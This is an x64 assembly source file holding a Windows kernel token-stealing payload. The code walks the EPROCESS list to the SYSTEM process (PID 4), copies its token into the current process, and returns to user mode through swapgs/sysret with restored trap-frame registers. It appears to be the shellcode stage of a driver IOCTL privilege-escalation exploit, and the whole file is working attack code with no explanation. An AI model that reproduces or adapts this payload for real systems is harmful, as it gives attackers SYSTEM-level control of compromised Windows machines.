_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	xor     rax, rax								;
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+448h]				;
	sub     rax, 448h								;
	mov     rcx, qword ptr [rax+440h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+4B8h]				;
	mov     qword ptr [r8+4B8h], r9					;
	restore_execution:
	xor     rax, rax								;
	mov     rax, qword ptr gs:[rax+188h]			;_KPCR.Prcb.CurrentThread
	mov		cx, word ptr [rax + 1e4h]				; KTHREAD.KernelApcDisable
	inc	cx
	mov		word ptr [rax + 1e4h], cx
	mov		rdx, qword ptr [rax + 90h]				; ETHREAD.TrapFrame
	mov		rcx, qword ptr [rdx + 168h]			; ETHREAD.TrapFrame.Rip
	mov		r11, qword ptr [rdx + 178h]			; ETHREAD.TrapFrame.EFlags
	mov		rsp, qword ptr [rdx + 180h]			; ETHREAD.TrapFrame.Rsp
	mov		rbp, qword ptr [rdx + 158h]			; ETHREAD.TrapFrame.Rbp
	;db 0xcc
	xor		eax, eax 	; return STATUS_SUCCESS to NtDeviceIoControlFile 
	swapgs
	sysret	; nasm shit


TokenStealing ENDP

_TEXT	ENDS

End